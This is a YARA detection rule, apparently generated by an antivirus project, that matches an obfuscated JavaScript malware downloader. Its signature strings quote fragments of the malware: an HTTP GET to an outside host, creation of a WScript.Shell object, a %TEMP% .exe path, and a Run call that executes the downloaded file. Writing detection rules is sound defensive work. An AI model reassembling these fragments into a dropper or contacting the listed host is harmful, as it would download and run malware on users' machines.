rule sig_20160330_503e8f3c9155d09bf28e6929aa81352c {
  meta:
    description = "datamaliciousorder - file 20160330_503e8f3c9155d09bf28e6929aa81352c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "55f464b83abc375ec7096159e6f7ffad5bef74f59c4b6f9d86f6d0697847f12a"

  strings:
    $s1  = "_DJ[_XJ](\"GET\", \"http://spasupplyexpert.com/b3osa\", false);" fullword ascii
    $s2  = "function _E(_WY, _WK){_V = _V * 1; return _WY - _WK;};" fullword ascii
    $s3  = "var _DO = function _F() {return WScript[_C](\"WScript\"+\".Shell\");}(), _NM = 11;" fullword ascii
    $s4  = "if (_DJ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _J(){return _IM + \"\";};" fullword ascii
    $s6  = "function _VQ() {return _DO[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"oHimFqfC4h.ex\" + \"e\";};" fullword ascii
    $s7  = "function _TN() {return ((_Q == true) && (_Q == _VG)) ? 1 : _V;};" fullword ascii
    $s8  = "function _I(_W){_DO[\"Run\"](_W, _V, _V);};" fullword ascii
    $s9  = "function _GA(){return 22;};" fullword ascii
    $s10 = "return _E(_P, _U);" fullword ascii
    $s11 = "var _XM = new this[\"Date\"]();" fullword ascii
    $s12 = "function _B(){return _C;};" fullword ascii
    $s13 = " while (_K){" fullword ascii
    $s14 = "function _TD(_UO) {var _R = (1, 2, 3, 4, 5, _UO); return _R;};" fullword ascii
    $s15 = "function _BJ()" fullword ascii
    $s16 = "_Q = true; " fullword ascii
    $s17 = "var _Q = false;" fullword ascii
    $s18 = "var _Z = false;" fullword ascii
    $s19 = "_VG = true; " fullword ascii
    $s20 = "var _VG = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}